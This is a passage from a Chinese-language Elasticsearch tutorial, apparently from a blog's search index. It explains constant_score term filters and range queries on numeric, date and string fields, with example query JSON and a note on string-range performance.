<p>一旦增加这个用来索引项 term 数目信息的字段，我们就可以构造一个 constant_score 查询，来确保结果中的文档所包含的词项数量与要求是一致的：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /my_index/my_type/_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span>: &#123;</span><br><span class="line">        <span class="string">"constant_score"</span> : &#123;</span><br><span class="line">            <span class="string">"filter"</span> : &#123;</span><br><span class="line">                 <span class="string">"bool"</span> : &#123;</span><br><span class="line">                    <span class="string">"must"</span> : [</span><br><span class="line">                        &#123; <span class="string">"term"</span> : &#123; <span class="string">"tags"</span> : <span class="string">"search"</span> &#125; &#125;, (1)</span><br><span class="line">                        &#123; <span class="string">"term"</span> : &#123; <span class="string">"tag_count"</span> : 1 &#125; &#125; (2)</span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>(1) 查找所有包含 term search 的文档。<br>(2) 确保文档只有一个标签。</p>
<p>这个查询现在只会匹配具有单个标签 search 的文档，而不是任意一个包含 search 的文档。</p>
<h1 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h1><p>本章到目前为止，对于数字，只介绍如何处理精确值查询。 实际上，对数字范围进行过滤有时会更有用。例如，我们可能想要查找所有价格大于 $20 且小于 $40 美元的产品。</p>
<p>在 SQL 中，范围查询可以表示为：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">document</span></span><br><span class="line"><span class="keyword">FROM</span>   products</span><br><span class="line"><span class="keyword">WHERE</span>  price <span class="keyword">BETWEEN</span> <span class="number">20</span> <span class="keyword">AND</span> <span class="number">40</span></span><br></pre></td></tr></table></figure></p>
<p>Elasticsearch 有 range 查询， 不出所料地，可以用它来查找处于某个范围内的文档：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"range" : &#123;</span><br><span class="line">    "price" : &#123;</span><br><span class="line">        "gte" : 20,</span><br><span class="line">        "lte" : 40</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>range 查询可同时提供包含（inclusive）和不包含（exclusive）这两种范围表达式，可供组合的选项如下：</p>
<ol>
<li>gt: &gt; 大于（greater than）</li>
<li>lt: &lt; 小于（less than）</li>
<li>gte: &gt;= 大于或等于（greater than or equal to）</li>
<li>lte: &lt;= 小于或等于（less than or equal to）</li>
</ol>
<p>下面是一个范围查询的例子：.<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /my_store/products/_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span> : &#123;</span><br><span class="line">        <span class="string">"constant_score"</span> : &#123;</span><br><span class="line">            <span class="string">"filter"</span> : &#123;</span><br><span class="line">                <span class="string">"range"</span> : &#123;</span><br><span class="line">                    <span class="string">"price"</span> : &#123;</span><br><span class="line">                        <span class="string">"gte"</span> : 20,</span><br><span class="line">                        <span class="string">"lt"</span>  : 40</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果想要范围无界（比方说 &gt;20 ），只须省略其中一边的限制：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"range" : &#123;</span><br><span class="line">    "price" : &#123;</span><br><span class="line">        "gt" : 20</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="日期范围"><a href="#日期范围" class="headerlink" title="日期范围"></a>日期范围</h2><p>range 查询同样可以应用在日期字段上：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"range" : &#123;</span><br><span class="line">    "timestamp" : &#123;</span><br><span class="line">        "gt" : "2014-01-01 00:00:00",</span><br><span class="line">        "lt" : "2014-01-07 00:00:00"</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当使用它处理日期字段时， range 查询支持对 日期计算（date math） 进行操作，比方说，如果我们想查找时间戳在过去一小时内的所有文档：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"range" : &#123;</span><br><span class="line">    "timestamp" : &#123;</span><br><span class="line">        "gt" : "now-1h"</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个过滤器会一直查找时间戳在过去一个小时内的所有文档，让过滤器作为一个时间 滑动窗口（sliding window） 来过滤文档。</p>
<p>日期计算还可以被应用到某个具体的时间，并非只能是一个像 now 这样的占位符。只要在某个日期后加上一个双管符号 (||) 并紧跟一个日期数学表达式就能做到：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"range" : &#123;</span><br><span class="line">    "timestamp" : &#123;</span><br><span class="line">        "gt" : "2014-01-01 00:00:00",</span><br><span class="line">        "lt" : "2014-01-01 00:00:00||+1M" //(1)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>(1) 早于 2014 年 1 月 1 日加 1 月（2014 年 2 月 1 日 零时）<br>日期计算是 日历相关（calendar aware） 的，所以它不仅知道每月的具体天数，还知道某年的总天数（闰年）等信息。更详细的内容可以参考： 时间格式参考文档 。</p>
<h2 id="字符串范围"><a href="#字符串范围" class="headerlink" title="字符串范围"></a>字符串范围</h2><p>range 查询同样可以处理字符串字段， 字符串范围可采用 字典顺序（lexicographically） 或字母顺序（alphabetically）。例如，下面这些字符串是采用字典序（lexicographically）排序的：<br>5, 50, 6, B, C, a, ab, abb, abc, b<br>在倒排索引中的词项就是采取字典顺序（lexicographically）排列的，这也是字符串范围可以使用这个顺序来确定的原因。</p>
<p>如果我们想查找从 a 到 b （不包含）的字符串，同样可以使用 range 查询语法：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"range" : &#123;</span><br><span class="line">    "title" : &#123;</span><br><span class="line">        "gte" : "a",</span><br><span class="line">        "lt" :  "b"</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="注意基数"><a href="#注意基数" class="headerlink" title="注意基数"></a>注意基数</h2><p>数字和日期字段的索引方式使高效地范围计算成为可能。 但字符串却并非如此，要想对其使用范围过滤，Elasticsearch 实际上是在为范围内的每个词项都执行 term 过滤器，这会比日期或数字的范围过滤慢许多。</p>
<p>字符串范围在过滤 低基数（low cardinality） 字段（即只有少量唯一词项）时可以正常工作，但是唯一词项越多，字符串范围的计算会越慢。</p>
<h1 id="处理-Null-值"><a href="#处理-Null-值" class="headerlink" title="处理 Null 值"></a>处理 Null 值</h1>]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>elasticsearch</tag>
      </tags>
  </entry>
</search>
